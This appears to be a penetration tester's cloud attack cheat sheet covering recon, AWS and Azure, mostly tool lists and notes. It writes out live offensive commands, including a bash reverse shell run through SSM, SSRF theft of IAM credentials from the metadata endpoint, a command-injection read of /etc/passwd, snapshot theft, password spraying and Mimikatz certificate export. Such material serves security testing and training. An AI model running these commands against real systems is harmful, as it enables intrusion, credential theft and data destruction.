# Cloud

## General

```text
**Tools**
# Non provider specific and general purpose
# https://github.com/nccgroup/ScoutSuite
# https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k companynameorkeyword

# Dictionary
https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb

Searching for bad configurations

No auditable items:
• DoS testing
• Intense fuzzing
• Phishing the cloud provider’s employees
• Testing other company’s assets
• Etc.

Audit policies:

# Azure
https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement
# Aws
https://aws.amazon.com/security/penetration-testing/
# GCP
https://support.google.com/cloud/answer/6262505?hl=en

# Quicks
.cspkg file its a gold mine, its a zip file with all the compiled code and config files.
```

![](../../.gitbook/assets/image%20%281%29.png)

## Recon

```text
• First step should be to determine what services are in use
• More and more orgs are moving assets to the cloud one at a time
• Many have limited deployment to cloud providers, but some have fully embraced the cloud and are using it for AD, production assets, security products, and more
• Determine things like AD connectivity, mail gateways, web apps, file storage, etc.
• Traditional host discovery still applies
• After host discovery resolve all names, then perform whois
lookups to determine where they are hosted
• Microsoft, Amazon, Google IP space usually indicates cloud service usage
   ◇ More later on getting netblock information for each cloud service
• MX records can show cloud-hosted mail providers
• Certificate Transparency (crt.sh)
• Monitors and logs digital certs
• Creates a public, searchable log
• Can help discover additional subdomains
• More importantly… you can potentially find more Top Level Domains (TLD’s)!
• Single cert can be scoped for multiple domains
• Search (Google, Bing, Baidu, DuckDuckGo): site:targetdomain.com -site:www.targetdomain.com
• Shodan.io and Censys.io zoomeye.org
• Internet-wide portscans
• Certificate searches
• Shodan query examples:
   ◇ org:”Target Name”
   ◇ net:”CIDR Range”
   ◇ port:”443”
• DNS Brute Forcing
• Performs lookups on a list of potential subdomains
• Make sure to use quality lists
• SecLists: https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
• MX Records can help us identify cloud services in use
   ◇ O365 = target-domain.mail.protection.outlook.com
   ◇ G-Suite = google.com | googlemail.com
   ◇ Proofpoint = pphosted.com
• If you find commonalities between subdomains try iterating names
•  Other Services
   ◇ HackerTarget https://hackertarget.com/
   ◇ ThreatCrowd  https://www.threatcrowd.org/
   ◇ DNSDumpster  https://dnsdumpster.com/
   ◇ ARIN Searches  https://whois.arin.net/ui/
      ▪ Search bar accepts wild cards “*”
      ▪ Great for finding other netblocks owned by the same organization
• Azure Netblocks
      ▪ Public: https://www.microsoft.com/en-us/download/details.aspx?id=56519
      ▪ US Gov: http://www.microsoft.com/en-us/download/details.aspx?id=57063
      ▪ Germany: http://www.microsoft.com/en-us/download/details.aspx?id=57064
      ▪ China: http://www.microsoft.com/en-us/download/details.aspx?id=57062
• AWS Netblocks
   ◇ https://ip-ranges.amazonaws.com/ip-ranges.json
• GCP Netblocks
   ◇ Google made it complicated so there’s a script on the next page to get the current IP netblocks.
• Box.com Usage
   ◇ Look for any login portals
      ▪ https://companyname.account.box.com
   ◇ Can find cached Box account data too 
• Employees
   ◇ LinkedIn
   ◇ PowerMeta https://github.com/dafthack/PowerMeta
   ◇ FOCA https://github.com/ElevenPaths/FOCA
   ◇ hunter.io

 Tools:
    • Recon-NG https://github.com/lanmaster53/recon-ng
    • OWASP Amass https://github.com/OWASP/Amass
    • Spiderfoot https://www.spiderfoot.net/
    • Gobuster https://github.com/OJ/gobuster
    • Sublist3r https://github.com/aboul3la/Sublist3r

Foothold:
• Find ssh keys in shhgit.darkport.co.uk https://github.com/eth0izzle/shhgit
• GitLeaks https://github.com/zricethezav/gitleaks
• Gitrob https://github.com/michenriksen/gitrob
• Truffle Hog https://github.com/dxa4481/truffleHog

Password attacks:
• Password Spraying
   ◇ Trying one password for every user at an org to avoid account lockouts (Spring2020)
• Most systems have some sort of lockout policy
   ◇ Example: 5 attempts in 30 mins = lockout
• If we attempt to auth as each individual username one time every 30 mins we lockout nobody
• Credential Stuffing
   ◇ Using previously breached credentials to attempt to exploit password reuse on corporate accounts
• People tend to reuse passwords for multiple sites including corporate accounts
• Various breaches end up publicly posted
• Search these and try out creds
• Try iterating creds

Web server explotation
• Out-of-date web technologies with known vulns
• SQL or command injection vulns
• Server-Side Request Forgery (SSRF)
• Good place to start post-shell:
• Creds in the Metadata Service
• Certificates
• Environment variables
• Storage accounts
• Reused access certs as private keys on web servers
   ◇ Compromise web server
   ◇ Extract certificate with Mimikatz
   ◇ Use it to authenticate to Azure
• Mimikatz can export “non-exportable” certificates:
    mimikatz# crypto::capi
    mimikatz# privilege::debug
    mimikatz# crypto::cng
    mimikatz# crypto::certificates /systemstore:local_machine /store:my /export

Phising
• Phishing is still the #1 method of compromise
• Target Cloud engineers, Developers, DevOps, etc.
• Two primary phishing techniques:
   ◇ Cred harvesting / session hijacking
   ◇ Remote workstation compromise w/ C2
• Attack designed to steal creds and/or session cookies
• Can be useful when security protections prevent getting shells
• Email a link to a target employee pointing to cloned auth portal
   ◇ Examples: Microsoft Online (O365, Azure, etc.), G-Suite, AWS Console
• They auth and get real session cookies… we get them too.

Phishing: Remote Access
• Phish to compromise a user’s workstation
• Enables many other options for gaining access to cloud resources
• Steal access tokens from disk
• Session hijack
• Keylog
• Web Config and App Config files
   ◇ Commonly found on pentests to include cleartext creds
   ◇ WebApps often need read/write access to cloud storage or DBs
   ◇ Web.config and app.config files might contain creds or access tokens
   ◇ Look for management cert and extract to pfx like publishsettings files
   ◇ Often found in root folder of webapp
• Internal Code Repositories
   ◇ Gold mine for keys
   ◇ Find internal repos:
      ▪ A. Portscan internal web services (80, 443, etc.) then use EyeWitness to screenshot each service to quickly analyze
      ▪ B. Query AD for all hostnames, look for subdomains git, code, repo, bitbucket, gitlab, etc..
   ◇ Can use automated tools (gitleaks, trufflehog, gitrob) or use built-in search features
      ▪ Search for AccessKey, AKIA, id_rsa, credentials, secret, password, and token
• Command history
• The commands ran previously may indicate where to look
• Sometimes creds get passed to the command line
• Linux hosts command history is here:
   ◇ ~/.bash_history
• PowerShell command history is here:
   ◇ %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Post-Compromise Recon
• Who do we have access as?
• What roles do we have?
• Is MFA enabled?
• What can we access (webapps, storage, etc.?)
• Who are the admins?
• How are we going to escalate to admin?
• Any security protections in place (ATP, GuardDuty, etc.)?
```

![](../../.gitbook/assets/image%20%282%29.png)

## AWS

```text
**Tools**
# Find buckets 
# https://github.com/0xbharath/slurp
./slurp keyword -p permutations.json -t netflix -c 25
./slurp domain -t amazon.com 
./slurp internal
# https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k companynameorkeyword
# https://github.com/nahamsec/lazys3
ruby lazys3.rb companyname
# https://github.com/jordanpotti/AWSBucketDump
source /home/cloudhacker/tools/AWSBucketDump/bin/activate
touch s.txt
sed -i "s,$,-$bapname-awscloudsec,g" /home/cloudhacker/tools/AWSBucketDump/BucketNames.txt
python AWSBucketDump.py -D -l BucketNames.txt -g s.txt
# https://github.com/gwen001/s3-buckets-finder
php s3-buckets-bruteforcer.php --bucket gwen001-test002

# Unauth checkers
# https://github.com/sa7mon/S3Scanner
sudo python3 s3scanner.py sites.txt
sudo python ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
# https://github.com/jordanpotti/AWSBucketDump
python3 AWSBucketDump.py -l hosts.txt
# https://github.com/Ucnt/aws-s3-data-finder/
python3 find_data.py -n bucketname -u

# Auth required
# Pacu https://github.com/RhinoSecurityLabs/pacu
# AwsPwn https://github.com/dagrz/aws_pwn
# WeirdAAL https://github.com/carnal0wnage/weirdAAL
# Dufflebag https://github.com/bishopfox/dufflebag
# https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key XXXXXXXXXXXXX --secret-key XXXXXXXXXXX
# https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py
python aws_escalate.py
# https://github.com/RhinoSecurityLabs/pacu

Auth methods:
• Programmatic access - Access + Secret Key
   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
• Management Console Access
   ◇ Web Portal Access to AWS

Aws S3 permissions:
https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/

Recon:
• AWS Usage
   ◇ Some web applications may pull content directly from S3 buckets
   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   ◇ Burp Suite
   ◇ Navigate application like you normally would and then check for any requests to:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[OrgName]

S3:
• Amazon Simple Storage Service (S3)
   ◇ Storage service that is “secure by default”
   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
   ◇ Nslookup can help reveal region
   ◇ S3 URL Format:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[Org Name]
        # aws s3 ls s3://bucket-name-here --region 
        # aws s3api get-bucket-acl --bucket bucket-name-here
        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

EBS Volumes:
• Elastic Block Store (EBS)
• AWS virtual hard disks
• Can have similar issues to S3 being publicly available
• Dufflebag from Bishop Fox https://github.com/bishopfox/dufflebag
• Difficult to target specific org but can find widespread leaks

EC2:
• Like virtual machines
• SSH keys created when started, RDP for Windows.
• Security groups to handle open ports and allowed IPs.

PACU - An AWS exploitation framework from Rhino Security Labs
# https://github.com/RhinoSecurityLabs/pacu
• Modules examples:
   • S3 bucket discovery
   • EC2 enumeration
   • IAM privilege escalation
   • Persistence modules
   • Exploitation modules
   • And more…

AWS Instance Metadata URL
• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
• Can contain access/secret keys to AWS and IAM credentials
• This should only be reachable from the localhost
• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
• IAM credentials can be stored here:
   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
• CapitalOne Hack
   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
• Updated in November 2019 – Both v1 and v2 are available
• Supposed to defend the metadata service against SSRF and reverse proxy vulns
• Added session auth to requests
• First, a “PUT” request is sent and then responded to with a token
• Then, that token can be used to query data
--
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
--

# If we can steal AWS credentials, add to your configuration
aws configure --profile stolen
# Open ~/.aws/credentials
# Under the [stolen] section add aws_session_token and add the discovered token value here
aws sts get-caller-identity --profile stolen


Post-compromise
• What do our access keys give us access to?
• WeirdAAL – Great tool for enumerating AWS access https://github.com/carnal0wnage/weirdAAL
   ◇ Run the recon_all module to learn a great deal about your access

https://github.com/toniblyx/my-arsenal-of-aws-security-tools
https://docs.aws.amazon.com/es_es/general/latest/gr/aws-security-audit-guide.html

export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_DEFAULT_REGION=

aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws iam get-account-password-policy
aws sts get-session-token

# AWS nuke - remove all AWS services of our account
# https://github.com/rebuy-de/aws-nuke
- Fill nuke-config.yml with the output of aws sts get-caller-identity
./aws-nuke -c nuke-config.yml # Checks what will be removed
- If fails because there is no alias created
aws iam create-account-alias --account-alias unique-name
./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation
# Cloud Nuke
# https://github.com/gruntwork-io/cloud-nuke
cloud-nuke aws
```

### **EC2 example attacks**

```text
# Like traditional host
- Port enumeration
- Attack interesting services like ssh or rdp

# SSRF to http://169.254.169.254 (Metadata server)
curl http://<ec2-ip-address>/\?url\=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key/
http://169.254.169.254/latest/user-data

# Find IAM Security Credentials
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Using EC2 instance metadata tool
ec2-metadata -h
# With EC2 Instance Meta Data Service version 2 (IMDSv2):
Append X-aws-ec2-metadata-token Header generated with a PUT request to http://169.254.169.254/latest/api/token

# Check directly for metadata instance
curl -s http://<ec2-ip-address>/latest/meta-data/ -H 'Host:169.254.169.254'
```

### **AWS Lambda**

```text
# Welcome to serverless!!!!
# AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.

# OS command Injection in Lambda
curl "https://API-endpoint/api/stringhere"
# For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
aws lambda list-functions --profile stolen
aws lambda get-function --function-name <FUNCTION-NAME> --profile stolen
```

### **AWS Inspector**

```text
# Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS.
```

### **S3 examples attacks**

```text
# S3 Bucket Pillaging

• GOAL: Locate Amazon S3 buckets and search them for interesting data
• In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.

~$ sudo apt-get install python3-pip
~$ git clone https://github.com/RhinoSecurityLabs/pacu
~$ cd pacu
~$ sudo bash install.sh
~$ sudo aws configure
~$ sudo python3 pacu.py

Pacu > import_keys --all
# Search by domain
Pacu > run s3__bucket_finder -d glitchcloud 
# List files in bucket
Pacu > aws s3 ls s3://glitchcloud
# Download files
Pacu > aws s3 sync s3://glitchcloud s3-files-dir

# S3 Code Injection
• Backdoor JavaScript in S3 Buckets used by webapps 
• In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
• This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
• If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
• Can perform XSS-type attacks against webapp visitors
• Hook browser with Beef

# Domain Hijacking
• Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
• Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
• When assessing webapps look for 404’s to *.s3.amazonaws.com
• When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
• Go create the S3 bucket with the same name and region 
• Load malicious content to the new S3 bucket that will be executed when visitors hit the site
```

### **EBS attack example**

```text
# Discover EBS Snapshot and mount it to navigate
- Obtaning public snapshot name
aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
- Obtaining zone and instance
aws ec2 describe-instances --filters Name=tag:Name,Values=attacker-machine
- Create a new volume of it
aws ec2 create-volume --snapshot-id snap-03616657ede4b9862 --availability-zone <ZONE-HERE>
- Attach to an EC2 instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>
    - It takes some time, to see the status:
    aws ec2 describe-volumes --filters Name=volume-id,Values=<VOLUME-ID>
- Once is mounted in EC2 instance, check it, mount it and access it:
sudo lsblk
sudo mount /dev/xvdh1 /mnt
cd /mnt/home/user/companydata
```

### **AWS RDS \(DB\) attacks**

```text
# Just like a MySQL, try for sqli!
# Check if 3306 is exposed
# Sqlmap is your friend ;)

# Stealing RDS Snapshots
- Searching partial snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
- Restore in instance
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b
- Once restored, try to access
aws rds describe-db-instances --db-instance-identifier recoverdb
- Reset the master credentials
aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately
    - Takes some time, you can check the status:
    aws rds describe-db-instances
- Try to access it from EC2 instance which was restored
nc rds-endpoint 3306 -zvv    
- If you can't see, you may open 3306:
    - In RDS console, click on the recoverdb instance
    - Click on the Security Group
    - Add an Inbound rule for port 3306 TCP for Cloudhacker IP
 - Then connect it
 mysql -u <username> -p -h <rds-instance-endpoint>
```

### **AWS Systems Manager**

![](../../.gitbook/assets/imagen.png)

```text
# AWS SSM
- The agent must be installed in the machines
- It's used to create roles and policies

# Executing commands
aws ssm describe-instance-information #Get instance
- Get "ifconfig" commandId
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text --query "Command.CommandId"
- Execute CommandID generated for ifconfig
aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"

# Getting shell
- You already need to have reverse.sh uploaded to s3
#!/bin/bash
bash -i >& /dev/tcp/REVERSE-SHELL-CATCHER/9999 0>&1
- Start your listener
aws ssm send-command --document-name "AWS-RunRemoteScript" --instance-ids "INSTANCE-ID-HERE" --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"PATH-TO-S3-SHELL-SCRIPT\"}"],"commandLine":["/bin/bash NAME-OF-SHELL-SCRIPT"]}' --query "Command.CommandId"
```

### Aws Services Summary

| AWS Service | Should have been called | Use this to | It's like |
| :--- | :--- | :--- | :--- |
| EC2 | Amazon Virtual Servers | Host the bits of things you think of as a computer. | It's handwavy, but EC2 instances are similar to the virtual private servers you'd get at Linode, DigitalOcean or Rackspace. |
| IAM | Users, Keys and Certs | Set up additional users, set up new AWS Keys and policies. |  |
| S3 | Amazon Unlimited FTP Server | Store images and other assets for websites. Keep backups and share files between services. Host static websites. Also, many of the other AWS services write and read from S3. |  |
| VPC | Amazon Virtual Colocated Rack | Overcome objections that "all our stuff is on the internet!" by adding an additional layer of security. Makes it appear as if all of your AWS services are on the same little network instead of being small pieces in a much bigger network. | If you're familar with networking: VLANs |
| Lambda | AWS App Scripts | Run little self contained snippets of JS, Java or Python to do discrete tasks. Sort of a combination of a queue and execution in one. Used for storing and then executing changes to your AWS setup or responding to events in S3 or DynamoDB. |  |
| API Gateway | API Proxy | Proxy your apps API through this so you can throttle bad client traffic, test new versions, and present methods more cleanly. | 3Scale |
| RDS | Amazon SQL | Be your app's Mysql, Postgres, and Oracle database. | Heroku Postgres |
| Route53 | Amazon DNS + Domains | Buy a new domain and set up the DNS records for that domain. | DNSimple, GoDaddy, Gandi |
| SES | Amazon Transactional Email | Send one-off emails like password resets, notifications, etc. You could use it to send a newsletter if you wrote all the code, but that's not a great idea. | SendGrid, Mandrill, Postmark |
| Cloudfront | Amazon CDN | Make your websites load faster by spreading out static file delivery to be closer to where your users are. | MaxCDN, Akamai |
| CloudSearch | Amazon Fulltext Search | Pull in data on S3 or in RDS and then search it for every instance of 'Jimmy.' | Sphinx, Solr, ElasticSearch |
| DynamoDB | Amazon NoSQL | Be your app's massively scalable key valueish store. | MongoLab |
| Elasticache | Amazon Memcached | Be your app's Memcached or Redis. | Redis to Go, Memcachier |
| Elastic Transcoder | Amazon Beginning Cut Pro | Deal with video weirdness \(change formats, compress, etc.\). |  |
| SQS | Amazon Queue | Store data for future processing in a queue. The lingo for this is storing "messages" but it doesn't have anything to do with email or SMS. SQS doesn't have any logic, it's just a place to put things and take things out. | RabbitMQ, Sidekiq |
| WAF | AWS Firewall | Block bad requests to Cloudfront protected sites \(aka stop people trying 10,000 passwords against /wp-admin\) | Sophos, Kapersky |
| Cognito | Amazon OAuth as a Service | Give end users - \(non AWS\) - the ability to log in with Google, Facebook, etc. | OAuth.io |
| Device Farm | Amazon Drawer of Old Android Devices | Test your app on a bunch of different IOS and Android devices simultaneously. | MobileTest, iOS emulator |
| Mobile Analytics | Spot on Name, Amazon Product Managers take note | Track what people are doing inside of your app. | Flurry |
| SNS | Amazon Messenger | Send mobile notifications, emails and/or SMS messages | UrbanAirship, Twilio |
| CodeCommit | Amazon GitHub | Version control your code - hosted Git. | Github, BitBucket |
| Code Deploy | Not bad | Get your code from your CodeCommit repo \(or Github\) onto a bunch of EC2 instances in a sane way. | Heroku, Capistrano |
| CodePipeline | Amazon Continuous Integration | Run automated tests on your code and then do stuff with it depending on if it passes those tests. | CircleCI, Travis |
| EC2 Container Service | Amazon Docker as a Service | Put a Dockerfile into an EC2 instance so you can run a website. |  |
| Elastic Beanstalk | Amazon Platform as a Service | Move your app hosted on Heroku to AWS when it gets too expensive. | Heroku, BlueMix, Modulus |
| AppStream | Amazon Citrix | Put a copy of a Windows application on a Windows machine that people get remote access to. | Citrix, RDP |
| Direct Connect | Pretty spot on actually | Pay your Telco + AWS to get a dedicated leased line from your data center or network to AWS. Cheaper than Internet out for Data. | A toll road turnpike bypassing the crowded side streets. |
| Directory Service | Pretty spot on actually | Tie together other apps that need a Microsoft Active Directory to control them. |  |
| WorkDocs | Amazon Unstructured Files | Share Word Docs with your colleagues. | Dropbox, DataAnywhere |
| WorkMail | Amazon Company Email | Give everyone in your company the same email system and calendar. | Google Apps for Domains |
| Workspaces | Amazon Remote Computer | Gives you a standard windows desktop that you're remotely controlling. |  |
| Service Catalog | Amazon Setup Already | Give other AWS users in your group access to preset apps you've built so they don't have to read guides like this. |  |
| Storage Gateway | S3 pretending it's part of your corporate network | Stop buying more storage to keep Word Docs on. Make automating getting files into S3 from your corporate network easier. |  |
| Data Pipeline | Amazon ETL | Extract, Transform and Load data from elsewhere in AWS. Schedule when it happens and get alerts when they fail. |  |
| Elastic Map Reduce | Amazon Hadooper | Iterate over massive text files of raw data that you're keeping in S3. | Treasure Data |
| Glacier | Really slow Amazon S3 | Make backups of your backups that you keep on S3. Also, beware the cost of getting data back out in a hurry. For long term archiving. |  |
| Kinesis | Amazon High Throughput | Ingest lots of data very quickly \(for things like analytics or people retweeting Kanye\) that you then later use other AWS services to analyze. | Kafka |
| RedShift | Amazon Data Warehouse | Store a whole bunch of analytics data, do some processing, and dump it out. |  |
| Machine Learning | Skynet | Predict future behavior from existing data for problems like fraud detection or "people that bought x also bought y." |  |
| SWF | Amazon EC2 Queue | Build a service of "deciders" and "workers" on top of EC2 to accomplish a set task. Unlike SQS - logic is set up inside the service to determine how and what should happen. | IronWorker |
| Snowball | AWS Big Old Portable Storage | Get a bunch of hard drives you can attach to your network to make getting large amounts \(Terabytes of Data\) into and out of AWS. | Shipping a Network Attached Storage device to AWS |
| CloudFormation | Amazon Services Setup | Set up a bunch of connected AWS services in one go. |  |
| CloudTrail | Amazon Logging | Log who is doing what in your AWS stack \(API calls\). |  |
| CloudWatch | Amazon Status Pager | Get alerts about AWS services messing up or disconnecting. | PagerDuty, Statuspage |
| Config | Amazon Configuration Management | Keep from going insane if you have a large AWS setup and changes are happening that you want to track. |  |
| OpsWorks | Amazon Chef | Handle running your application with things like auto-scaling. |  |
| Trusted Advisor | Amazon Pennypincher | Find out where you're paying too much in your AWS setup \(unused EC2 instances, etc.\). |  |
| Inspector | Amazon Auditor | Scans your AWS setup to determine if you've setup it up in an insecure way | Alert Logic |

## Azure

```text
**Tools** 
# ROADtools https://github.com/dirkjanm/ROADtools
    ◇ Dumps all Azure AD info from the Microsoft Graph API 
    ◇ Has a GUI for interacting with the data 
    ◇ Plugin for BloodHound with connections to on-prem AD accounts if DirSync is enabled 
• PowerMeta https://github.com/dafthack/PowerMeta
• MicroBurst https://github.com/NetSPI/MicroBurst
• ScoutSuite https://github.com/nccgroup/ScoutSuite
• PowerZure https://github.com/hausec/PowerZure
• https://github.com/fox-it/adconnectdump
# Azurite https://github.com/FSecureLABS/Azurite
• https://github.com/mburrough/pentestingazureapps

Auth methods:
• Password Hash Synchronization
   ◇ Azure AD Connect
   ◇ On-prem service synchronizes hashed user credentials to Azure
   ◇ User can authenticate directly to Azure services like O365 with their internal domain credential
• Pass Through Authentication
   ◇  Credentials stored only on-prem
   ◇ On-prem agent validates authentication requests to Azure AD
   ◇ Allows SSO to other Azure apps without creds stored in cloud
• Active Directory Federation Services (ADFS)
   ◇ Credentials stored only on-prem
   ◇ Federated trust is setup between Azure and on-prem AD to validate auth requests to the cloud
   ◇ For password attacks you would have to auth to the on-prem ADFS portal instead of Azure endpoints
• Certificate-based auth
   ◇ Client certs for authentication to API
   ◇ Certificate management in legacy Azure Service Management (ASM) makes it impossible to know who created a cert (persistence potential)
   ◇ Service Principals can be setup with certs to auth
• Conditional access policies
• Long-term access tokens
   ◇ Authentication to Azure with oAuth tokens
   ◇ Desktop CLI tools that can be used to auth store access tokens on disk
   ◇ These tokens can be reused on other MS endpoints
   ◇ We have a lab on this later!
• Legacy authentication portals

Recon:
• O365 Usage
   ◇ https://login.microsoftonline.com/getuserrealm.srf?login=username@acmecomputercompany.com&xml=1
   ◇ https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@targetdomain.com?Protocol=Autodiscoverv1
• User enumeration on Azure can be performed at
    https://login.Microsoft.com/common/oauth2/token
      ▪ This endpoint tells you if a user exists or not
   ◇ Detect invalid users while password spraying with:
      ▪ https://github.com/dafthack/MSOLSpray
   ◇ For on-prem OWA/EWS you can enumerate users with timing attacks (MailSniper)

Microsoft Azure Storage:
• Microsoft Azure Storage is like Amazon S3
• Blob storage is for unstructured data
• Containers and blobs can be publicly accessible via access policies
• Predictable URL’s at core.windows.net
   ◇ storage-account-name.blob.core.windows.net
   ◇ storage-account-name.file.core.windows.net
   ◇ storage-account-name.table.core.windows.net
   ◇ storage-account-name.queue.core.windows.net
• The “Blob” access policy means anyone can anonymously read blobs, but can’t list the blobs in the container
• The “Container” access policy allows for listing containers and blobs
• Microburst https://github.com/NetSPI/MicroBurst
   ◇ Invoke-EnumerateAzureBlobs
   ◇ Brute forces storage account names, containers, and files
   ◇ Uses permutations to discover storage accounts
        PS > Invoke-EnumerateAzureBlobs –Base 

Password Attacks
• Password Spraying Microsoft Online (Azure/O365)
• Can spray https://login.microsoftonline.com
--
POST /common/oauth2/token HTTP/1.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Host: login.microsoftonline.com
Content-Length: 195
Expect: 100-continue
Connection: close

resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-
dac224a7b894&client_info=1&grant_type=password&username=user%40targetdomain.com&passwor
d=Winter2020&scope=openid
--
• MSOLSpray https://github.com/dafthack/MSOLSpray
   ◇ The script logs:
      ▪ If a user cred is valid
      ▪ If MFA is enabled on the account
      ▪ If a tenant doesn't exist
      ▪ If a user doesn't exist
      ▪ If the account is locked
      ▪ If the account is disabled
      ▪ If the password is expired
   ◇ https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

Password protections & Smart Lockout
• Azure Password Protection – Prevents users from picking passwords with certain words like seasons, company name, etc.
• Azure Smart Lockout – Locks out auth attempts whenever brute force or spray attempts are detected.
   ◇ Can be bypassed with FireProx + MSOLSpray
   ◇ https://github.com/ustayready/fireprox

Phising session hijack
• Evilginx2 and Modlishka
   ◇ MitM frameworks for harvesting creds/sessions
   ◇ Can also evade 2FA by riding user sessions
• With a hijacked session we need to move fast
• Session timeouts can limit access
• Persistence is necessary

Steal Access Tokens
• Azure Cloud Service Packages (.cspkg)
• Deployment files created by Visual Studio
• Possible other Azure service integration (SQL, Storage, etc.)
• Look through cspkg zip files for creds/certs
• Search Visual Studio Publish directory
    \bin\debug\publish
• Azure Publish Settings files (.publishsettings)
   ◇ Designed to make it easier for developers to push code to Azure
   ◇ Can contain a Base64 encoded Management Certificate
   ◇ Sometimes cleartext credentials
   ◇ Open publishsettings file in text editor
   ◇ Save “ManagementCertificate” section into a new .pfx file
   ◇ There is no password for the pfx
   ◇ Search the user’s Downloads directory and VS projects
• Check %USERPROFILE&\.azure\ for auth tokens
• During an authenticated session with the Az PowerShell module a TokenCache.dat file gets generated in the %USERPROFILE%\.azure\ folder.
• Also search disk for other saved context files (.json)
• Multiple tokens can exist in the same context file

Post-Compromise
• What can we learn with a basic user?
• Subscription Info
• User Info
• Resource Groups
• Scavenging Runbooks for Creds
• Standard users can access Azure domain information and isn’t usually locked down
• Authenticated users can go to portal.azure.com and click Azure Active Directory
• O365 Global Address List has this info as well
• Even if portal is locked down PowerShell cmdlets will still likely work
• There is a company-wide setting that locks down the entire org from viewing Azure info via cmd line: Set-MsolCompanySettings – UsersPermissionToReadOtherUsersEnabled $false

Azure: CLI Access
• Azure Service Management (ASM or Azure “Classic”)
   ◇ Legacy and recommended to not use
• Azure Resource Manager (ARM)
   ◇ Added service principals, resource groups, and more
   ◇ Management Certs not supported
• PowerShell Modules
   ◇ Az, AzureAD & MSOnline
• Azure Cross-platform CLI Tools
   ◇ Linux and Windows client

Azure: Subscriptions
• Organizations can have multiple subscriptions
• A good first step is to determine what subscription you are in
• The subscription name is usually informative
• It might have “Prod”, or “Dev” in the title
• Multiple subscriptions can be under the same Azure AD directory (tenant)
• Each subscription can have multiple resource groups

Azure User Information
• Built-In Azure Subscription Roles
   ◇ Owner (full control over resource)
   ◇ Contributor (All rights except the ability to change permissions)
   ◇ Reader (can only read attributes)
   ◇ User Access Administrator (manage user access to Azure resources)
• Get the current user’s role assignement
    PS> Get-AzRoleAssignment
